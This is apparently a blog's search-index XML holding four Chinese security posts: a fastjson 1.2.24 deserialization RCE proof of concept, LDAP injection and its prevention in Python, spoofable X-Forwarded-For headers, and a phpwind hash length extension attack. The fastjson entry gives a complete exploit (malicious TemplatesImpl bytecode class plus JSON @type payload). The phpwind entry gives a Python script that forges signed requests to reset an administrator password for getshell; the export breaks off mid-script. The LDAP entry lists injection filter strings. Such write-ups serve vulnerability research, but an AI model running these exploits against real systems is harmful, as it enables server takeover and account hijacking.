<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[fastjson 远程反序列化poc的构造和分析]]></title>
    <url>%2F2017%2F04%2F29%2Ftitle-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[fastjson 反序列化 poc 1.2.24 1 背景fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://github.com/alibaba/fastjson/wiki/security_update_20170315 2 受影响的版本fastjson &lt;= 1.2.24 3 静态分析根据官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括1bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework 下面我们来分析checkAutoType的函数实现：123456789101112131415161718192021222324252627282930313233343536373839public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; if (typeName.length() &gt;= maxTypeNameLength) &#123; throw new JSONException("autoType is not support. " + typeName); &#125; final String className = typeName.replace('$', '.'); if (autoTypeSupport || expectClass != null) &#123; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException("autoType is not support. " + typeName); &#125; &#125; &#125; Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125; if (clazz != null) &#123; if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException("type not match. " + typeName + " -&gt; " + expectClass.getName()); &#125; return clazz; &#125; 核心部分就是denyList的处理过程，遍历denyList，如果引入的库以denyList中某个deny打头，就会抛出异常，中断运行。 4 POC构造静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。刚开始fastjson官方公布漏洞信息时，当时就尝试构造poc，怎奈fastjson的代码确实庞大，还有asm机制，通过asm机制生成的临时代码下不了断点。当时也只能通过在通过类初始化的时候弹出一个计算器，很显然这个构造方式不具有通用性，最近jackson爆出反序列漏洞，其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。后来阅读ysoserial的代码时也发现在gadgets.java这个文件中也使用到了这个类来动态生成可执行命令的代码。下面是一个poc的代码 1234567891011121314151617181920212223242526import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Test extends AbstractTranslet &#123; public Test() throws IOException &#123; Runtime.getRuntime().exec("calc"); &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123; &#125; @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123; &#125; public static void main(String[] args) throws Exception &#123; Test t = new Test(); &#125;&#125; 这个是Test.java的实现，在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。后续会将Test.class的内容赋值给_bytecodes。接着分析poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty("file.separator"); final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test.class"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"; String text1 = "&#123;\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":&#123; &#125;," + "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 在这个poc中，最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，所以是设置不了的，弹计算器的图中的poc中展示了但是实际运行却没有使用，只能依赖于jdk的实现，作者在1.8.0_25,1.7.0_05测试都能弹出计算器，某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。接下来我们看下TemplatesImpl.java的几个关键函数： 12345678public synchronized Properties getOutputProperties() &#123; try &#123; return newTransformer().getOutputProperties(); &#125; catch (TransformerConfigurationException e) &#123; return null; &#125;&#125; 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 12345678910111213141516171819202122232425262728private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (IllegalAccessException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new Hashtable(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也也就到了最终的执行命令的位置Runtime.getRuntime.exec() 下面我们上一张调用链的图，,简单来说就是 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 附上一张成功执行图： 5 总结poc影响jdk 1.7，1.8版本，1.6未测试，但是需要在parseObject的时候设置Feature.SupportNonPublicField，最后给大家上个福利，github地址：完整的Intellij IDEA poc环境:]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
        <tag>反序列化</tag>
        <tag>poc</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全编码之预防LDAP注入]]></title>
    <url>%2F2016%2F12%2F01%2FPython%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E4%B9%8B%E9%A2%84%E9%98%B2LDAP%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1 LDAP简介LDAP（Lightweight Directory Access Protocol）轻量级目录协议，是一种在线目录访问协议，主要用于资源查询，是X.500的一种简便的实现。它是一种树结构，查询效率很高，插入效率稍低。目录和数据库有很多相似之处，都用于存放数据，可以查询插入，目录可以存放各种数据，而数据库的数据则有比较严格的约束条件。LDAP目录以入口(entry，目录中存储的基本信息单元)的形式存储和组织数据结构，每个入口有一个唯一标示自己的专属名称(distnguished name)，DN由系列RDNs(ralative distinguished names)组成。另外还有两个常见的结构，对象类和属性。对象类(object class)会定义独一的OID，每个属性(attribute)也会分配唯一的OID号码。 2 LDAP注入原理谈起LDAP注入首先得从LDAP的查询语法开始，基本的查询语法如下：search语法：attribute operator value search filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter)) 主要根据属性和值进行搜索，就如浏览网页时我们通常并不会浏览某个目录，而是其下存在的某个文件。 LDAP的URL形式为：ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]] 例如： ldap://austin.ibm.com/ou=Austin,o=IBM 2.1 注入过程从注入原理来看，ldap注入分为and注入和or注入，先看and注入情形，假设查询结构如下(&amp;(user=username)(passwd=password)),这可能是采用采用LDAP进行登录验证的查询语句，其中username和password都是用户可控制的参数，那么可以在user处注入admin*)(objectClass=*)形成如下(&amp;(user=admin*)(objectClass=*))(passwd=password)) 有点小语法错误，如果在user处注入admin*)(objectClass=*))(&amp;(objectClass=*(&amp;(user=admin*)(objectClass=*))(|(objectClass=void)(passwd=passwd)) 无语法错误,对于openldap来说，只会执行第一个&amp;括号内的内容，由于objectClass=*恒为真，我们就能无需密码以admin用户的身份登录系统如果不允许两个过滤服务器的执行，则是(&amp;(user=username)(injected_filter)(passwd=password)) 对于or注入，查询表达式如下：(|(user=username)(email=email_addr))假如username可控，即可注入username*)(objectClass=void))(|objectClass=void形成(|(user=username)(objectClass=void))(|objectClass=void)(email=email_addr)),由于objectClass=void恒为假，所以只有user=username的时候整个值为真。 2.2 渗透技巧对于渗透测试来说，还是要看报错，比如输入\,如果关闭了报错接口，可以通过正确参数后加”“字符，如果返回一致，必有蹊跷，很有可能就是一个注入点，接着就可以尝试盲注的方式，简单的盲注就是”a*”这种方式。 2.3 调试与验证在代码审计过程中，有些时候代码结构庞大，为了验证是否存在注入点，不好直接改写在python命令行中执行，那么就可以尝试打开ldap的日志，这样直接从url参数中加入注入元素，就能很好的观察注入的效果。下面是打开ldap日志的方法。一般的文章中都是打开syslogd，如果已经替换成了rsyslogd，也不要惊慌。rsyslogd是syslogd的升级包，原来的配置文件都还可用，增加了很多新功能，如能监听端口或者IP。下面就是打开LDAP日志的步骤： 1.在slapd.conf中加一行： 4095 ```12342.在/etc/rsyslog.conf 中加入ldap日志文档：```local4.* /var/log/ldap.log 3.在终端用命令重启syslog服务 service rsyslog restart```1234564.在/var/log/下可以找到一个ldap.log文件随着时间增长，这个日志会增长较快，注意删除。有时候为了查看实际的搜索结果，可以下载ldap的相关工具，在windows下推荐使用LDAP Administrator，linux下可以使用ldapsearch工具，ldapsearch具体用法如下：```ldapsearch -h 10.5.5.5 -p 389 -D &apos;o=customer&apos; -W -x -b &quot;o=customer&quot; &quot;cn=645*&quot; binddn bind DN123-W prompt for bind password-x Simple authentication-b basedn base dn for search 3 python 安全编码如何在python中防止LDAP注入呢？首先我们来看下简单的ldap连接，绑定再到查询的示例，这个查询是存在注入风险的，请不要模仿，请不要模仿，请不要模仿。 1234567In [70]: import ldapIn [71]: l = ldap.initialize(&apos;ldap://10.5.0.220:389&apos;)In [76]: l.bind(&apos;LDAP_ROOTDN&apos;,&apos;LDAP_ROOTPW&apos;)Out[76]: 4In [77]: l.search_s(&apos;LDAP_ROOTDN&apos;,ldap.SCOPE_SUBTREE,&apos;(cn=645*)&apos;)Out[77]:[(&apos;cn=64502d93-a8ab-3ba1-991a-74cfde8cb333,cn=admin,o=3333049f-92d2-3c3a-91c2-6e1ef4c6a6bf,o=customer&apos;,....... 而且ldap的查询接口不像sql结果，有参数化查询，ldap的接口只能从参数过滤上做功夫来防止注入,但是好歹ldap提供了一个安全过滤接口ldap.filter.在这个接口中有escape_filter_chars函数，源码如下： 123456789101112131415161718192021222324252627282930def escape_filter_chars(assertion_value,escape_mode=0): """ Replace all special characters found in assertion_value by quoted notation. escape_mode If 0 only special chars mentioned in RFC 4515 are escaped. If 1 all NON-ASCII chars are escaped. If 2 all chars are escaped. """ if escape_mode: r = [] if escape_mode==1: for c in assertion_value: if c &lt; '0' or c &gt; 'z' or c in "\\*()": c = "\\%02x" % ord(c) r.append(c) elif escape_mode==2: for c in assertion_value: r.append("\\%02x" % ord(c)) else: raise ValueError('escape_mode must be 0, 1 or 2.') s = ''.join(r) else: s = assertion_value.replace('\\', r'\5c') s = s.replace(r'*', r'\2a') s = s.replace(r'(', r'\28') s = s.replace(r')', r'\29') s = s.replace('\x00', r'\00') return s 源码解读如下：如果未设置转义模式，就将\,*,(,),\x00这5个字符转成其ascii码值。那么如何过滤呢？代码如下： 1name=ldap.filter.escape_filter_chars(name) 经过过滤之后再丢到查询参数中。或者使用filter_format,注意占位符%s和参数的对应关系。 123current_app.setdefault('LDAP_GROUP_OBJECT_FILTER', '(&amp;(objectclass=Group)(userPrincipalName=%s))')query = ldap.filter.filter_format( current_app['LDAP_USER_OBJECT_FILTER'], (user,)) 总之记住一条，ldap的搜索参数是需要手工过滤的。 参考链接： http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>LDAP注入</tag>
        <tag>安全编码</tag>
        <tag>预防注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取用户IP的正确姿势]]></title>
    <url>%2F2016%2F11%2F01%2F%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7IP%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[如何获取用户的IP，这个需求简直是太常见了，像登录入口，注册入口，投票，日志记录，api接口中判断同一个ip单位时间内的请求数，可是怎么去获取用户的真实IP呢？网上的代码很多，好多人直接拿来就用，却没有想到带来了很大的安全问题。 1 代码示例12345678910&lt;?phpif(!empty($_SERVER['HTTP_CLIENT_IP']))&#123; $myip = $_SERVER['HTTP_CLIENT_IP'];&#125;else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $myip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123; $myip= $_SERVER['REMOTE_ADDR'];&#125;echo $myip;?&gt; 这是网上的一个示范例子，我们很多同事也这么写，上面这个例子是php实现的，由于HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,HTTP_X_FORWARDED,HTTP_X_CLUSTER_CLIENT_IP,HTTP_FORWARDED_FOR,HTTP_FORWARDED，HTTP_VIA (经过的 Proxy)这些以HTTP打头的server变量都是用户可控的，由此可导致xss，认证绕过等缺陷。下面我们看下python的例子： 12345678def get_ip(request): try: return request.META['HTTP_X_FORWARDED_FOR'] except KeyError: try: return request.META['HTTP_X_REAL_IP'] except KeyError: return request.META.get('REMOTE_ADDR', None) 也是由于客户端变量可控导致获取的ip可为任意值。在此例中,X-Real-IP是nginx特有的，通过配置proxy_set_header X-Real-IP $remote_addr;从REMOTE_ADDR中取值。 2 X-Forwarded-For和 REMOTE_ADDR的区别REMOTE_ADDR代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。 正如前面所说，有了代理就获取不了用户的真实IP，由此X-Forwarded-For应运而生，它是一个非正式协议，在请求转发到代理的时候代理会添加一个X-Forwarded-For头，将连接它的客户端IP（也就是你的上网机器IP）加到这个头信息里，这样末端的服务器就能获取真正上网的人的IP了。 假设用户的请求顺序如下： 网民电脑ip-&gt;代理服务器1–&gt;代理服务器2–&gt;目标服务器 REMOTE_ADDR:代理服务器2的IP值 X-Forwarded-For就是：网民电脑IP，代理1的IP，代理2的IP 在这里只有REMOTE_ADDR是可信的，其他从客户端获取的数据都是不可信的，都是可伪造的。下面简单示例下一个篡改X-Forwarded-For的情况： 12345678910GET / HTTP/1.1Host: www.myip.cnCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: Hm_lvt_380ffd3c2225d34ca2087c6970395366=1473755162; Hm_lpvt_380ffd3c2225d34ca2087c6970395366=1473755299; sc_is_visitor_unique=rx4067297.1473755300.43C8C2ACB3CA4FAAEB8885235516D36A.1.1.1.1.1.1.1.1.1X-Forwarded-For: 127.0.0.111111 返回信息是： 1&lt;font style="font-family:Arial,Helvetica,Sans Serif;font-size: 24pt;" color="#0066CC"&gt;&lt;b&gt;您的IP地址: 127.0.0.111111&lt;/b&gt;&lt;/font&gt; 3 正确的代码示例：在X-Forwarded-For信息头中可以提取真实的用户IP，但是这个IP是可以伪造的，如果从X-Forwarded-For提取IP作为用户的IP对于存在登录次数，api速率限制等一些接口是致命的缺陷，因为任意构造出无数的合法或者非法IP地址。而REMOTE_ADDR只是服务器前端的IP地址，如果没有代理就是用户的真实地址。这个是不可伪造的，而且代理是有限的，可以基于此来获取IP。在wordpress中，获取客户的IP地址代码如下： 1$remote_ip = preg_replace( '/[^0-9a-fA-F:., ]/', '', $_SERVER['REMOTE_ADDR'] ); 如果是python代码的话： 1remote_ip = request.META.get('REMOTE_ADDR', None) 当然上述代码也存在缺陷，就是服务器端开了nginx反向代理的时候，每次获取的都是反向代理的IP，这不是我们的预期，需要nginx在配置反向代理的时候做一定设置并且修改代码。如： 123proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 或者采用realip模块，配置如下： 12set_real_ip_from 10.1.10.0/24;real_ip_header X-Forwarded-For; 在存在反向代理的情况下，如果直接获取REMOTE_ADDR，得到的是反向代理IP的值，从上面的配置也可以看出，在反向代理nginx的配置中将REMOTE_ADDR赋给了X-Real-IP，那么也是从X-Real-IP中来获取用户的IP，如下才是正确的获取用户IP的方式： 12345def get_ip(request): try: return request.META[&apos;HTTP_X_REAL_IP&apos;] except KeyError: return request.META.get(&apos;REMOTE_ADDR&apos;,None) 4 总结X-Forwarded-For可被用户伪造，不应该被信任；REMOTE_ADDR是使用“REMOTE_ADDR”机器的前一个建立tcp连接的机器的地址，是不可伪造的，在无代理时可以理解为用户的IP地址，有反向代理时，先将REMOTE_ADDR赋给X-Real-IP，最后可以从X-Real-IP中获取用户的IP。 参考文献： http://gong1208.iteye.com/blog/1559835 http://devco.re/blog/2014/06/19/client-ip-detection/ http://blog.pengqi.me/2013/04/20/remote-addr-and-x-forwarded-for/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>X-Forward-For</tag>
        <tag>REMOTE_ADDR</tag>
        <tag>用户IP</tag>
        <tag>nginx</tag>
        <tag>反向代理</tag>
        <tag>HTTP_X_FORWARDED_FOR</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phpwind利用hash长度扩展攻击修改后台密码getshell]]></title>
    <url>%2F2016%2F08%2F01%2FPhpWind%20%E5%88%A9%E7%94%A8hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BF%AE%E6%94%B9%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81getshell%2F</url>
    <content type="text"><![CDATA[#1 哈希长度扩展攻击 ##1.1 简介哈希长度扩张攻击（hash length attack）是一类针对某些哈希函数可以额外添加一些信息的攻击手段，适用于已经确定哈希值和密钥长度的情况。哈希值基本表示如下H（密钥||消息），即知道了哈希值和密钥的长度，可以推出H（密钥||消息||padding||append）的哈希值，padding是要填充的字段，append则是要附加的消息。其实如果不知道密钥长度，可通过暴力猜解得到，已知的有长度扩展攻击缺陷的函数有MD5，SHA-1，SHA-256等等,详细的攻击原理可参考Everything you need to know about hash length extension attacks ##1.2 利用这里推荐有python扩展的HashPump，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。安装：pip install hashpumpy1234567891011root@kali:~/python# hashpump --helpHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; -s参数对应的就是H(密钥||消息)中的哈希值，-d参数对应着消息，-k参数对应着密钥的长度，-a则是要附加的消息。123root@kali:~/python# hashpump -s &quot;ebfe0fff1806cfe6186c6a0b172e8148&quot; -d &quot;1465895192adoAvatarcavatarmapitypeflashuid2uidundefined&quot; -k 32 -a namespacesiteaeditUsercusermapipasswordGongFang9uid14daee9a61955a1c17319f4c1664d11df1465895192adoAvatarcavatarmapitypeflashuid2uidundefined\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x00\x00\x00namespacesiteaeditUsercusermapipasswordGongFang9uid1 最后提供一个哈希扩展攻击在线工具：http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2] #2 phpwind利用点分析phpwind会在每次请求的时候校验密钥，具体的对应函数如下：123456789101112131415public function beforeAction($handlerAdapter) &#123; parent::beforeAction($handlerAdapter); $charset = &apos;utf-8&apos;; $_windidkey = $this-&gt;getInput(&apos;windidkey&apos;, &apos;get&apos;); $_time = (int)$this-&gt;getInput(&apos;time&apos;, &apos;get&apos;); $_clientid = (int)$this-&gt;getInput(&apos;clientid&apos;, &apos;get&apos;); if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL); $clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid); if (!$clent) $this-&gt;output(WindidError::FAIL); if (WindidUtility::appKey($clent[&apos;id&apos;], $_time, $clent[&apos;secretkey&apos;], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey) $this-&gt;output(WindidError::FAIL); $time = Pw::getTime(); if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT); $this-&gt;appid = $_clientid;&#125; 在这个函数中会提取windidkey，并且和WindidUtility::appKey生成的结果做对比，不同则退出，如过相同继续判断时间是否超时，超时也退出，appKey的实现如下：1234567891011121314151617public static function appKey($apiId, $time, $secretkey, $get, $post) &#123; // 注意这里需要加上__data，因为下面的buildRequest()里加了。 $array = array(&apos;windidkey&apos;, &apos;clientid&apos;, &apos;time&apos;, &apos;_json&apos;, &apos;jcallback&apos;, &apos;csrf_token&apos;, &apos;Filename&apos;, &apos;Upload&apos;, &apos;token&apos;, &apos;__data&apos;); $str = &apos;&apos;; ksort($get); ksort($post); foreach ($get AS $k=&gt;$v) &#123; if (in_array($k, $array)) continue; $str .=$k.$v; &#125; foreach ($post AS $k=&gt;$v) &#123; if (in_array($k, $array)) continue; $str .=$k.$v; &#125; return md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str);&#125; 在函数中md5(md5($apiId.&#39;||&#39;.$secretkey).$time.$str)的值是知道的，即windidkey，这个值在用户上传头像处泄露，md5($apiId.&#39;||&#39;.$secretkey)的长度是知道的，32bit，$time.$str参数是用户可控的，那么就满足了哈希扩展长度攻击，下面我们看下用户上传头像处的请求，右键查看源代码找到如下请求：1http://192.168.3.106/windid/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid=2&amp;windidkey=b6f98f9e78105ca0ec4239de8478cd26&amp;time=1465977216&amp;clientid=1&amp;type=flash&amp;avatar=http://192.168.3.106/windid/attachment//avatar/000/00/00/2.jpg?r=18504 接着看实际构造的appKey的参数效果,这个可以根据trace的结果直接给出，具体如下：1md5(&apos;520a1e355b8cfc82e56ae578176d7f101465977216adoAvatarcavatarmapitypeflashuid2uidundefined&apos;) /var/www/html/src/windid/service/base/WindidUtility.php:54 md5($apiId.&#39;||&#39;.$secretkey)的值为520a1e355b8cfc82e56ae578176d7f10，$time为1465977216,$str为adoAvatarcavatarmapitypeflashuid2uidundefined,从appKey函数的实现来看，$str就是get，post请求进行取舍排序得到的。有了这个基础，根据hashpump公式，在post请求中加入我们的参数，并计算出合适的windidkey值，提交请求，就可达到目的。 #3 利用POC可利用如下的代码构造post请求，修改某uid用户的密码。如果修改的是管理员的密码，并且这管理员有相应的后台权限，那么我们就可以在后台getshell，利用脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!env python# coding=utf-8import hashpumpyimport urllibimport urlparseimport urllib2import requestsdef md5hack(md5, ori_str, append, security_len): md5, message = hashpumpy.hashpump(md5, ori_str,append, security_len) quoted_message = urllib.quote(message) print &apos;md5 after hash length attacked:&apos;,md5 print &apos;message:&apos;,message print &apos;quote message:&apos;,quoted_message return (md5,quoted_message)def modify_passwd(ip, uid, target_uid, windidkey, padding, time, password=&quot;GongFang9&quot;): &quot;&quot;&quot;修改后台管理员的密码&quot;&quot;&quot; target_uid = target_uid #uid是后台管理的uid参数 host = &quot;http://&quot; + ip data = &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid, password) url = &quot;&#123;0&#125;/windid/index.php?windidkey=&#123;1&#125;&amp;adoAvatarcavatarmapitypeflashuid&#123;2&#125;uidundefined=&#123;3&#125;&amp;clientid=1&amp;time=&#123;4&#125;&amp;namespace=site&quot;.format(host,windidkey,uid,padding,time) print &apos;url:&apos;,url print &apos;data:&apos;,data r = requests.post(url,data=data) #r = requests.post(url,data=data,headers=headers) print r.text if r.text.strip() == &quot;1&quot;: print &apos;modify password Succeed&apos; else: print &apos;failed&apos;if __name__ == &quot;__main__&quot;: &quot;&quot;&quot;点开用户头像上传处,右键查看源码,搜索windidkey,拷贝含flash字段的那个request作为r参数&quot;&quot;&quot; r = 